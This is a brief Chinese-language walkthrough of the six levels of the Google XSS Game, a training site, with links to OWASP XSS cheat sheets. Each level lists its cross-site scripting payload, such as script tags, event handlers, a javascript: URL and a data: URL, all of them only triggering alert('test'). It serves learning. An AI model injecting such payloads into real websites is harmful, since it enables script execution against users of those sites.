Google XSS Game  
------------

[链接地址](https://xss-game.appspot.com)
[Hacker News](https://news.ycombinator.com/item?id=7815237)

**XSS攻击相关链接**  
[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
[XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)  
[Cross-site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29)  


**Level1**  

输入框输入:  &lt;script&gt;alert('test')&lt;/script&gt;

**Level2**  

输入框输入:  &lt;i onmouseover=&quot;alert('test')&quot;&gt;&lt;i&gt;

**Level3**  

链接地址后面添加: '&gt;&lt;script&gt;alert('test')&lt;/script&gt;

**Level4**  

输入框输入:  3');alert('test

**Level5**  

- 点击"Signup"
- 页面跳转后, 修改链接地址后面: ?next=javascript:alert('test')  
- 然后点击"Next>>"  

**Level6**  

- 链接地址输入: #data:text/javascript,alert('test')  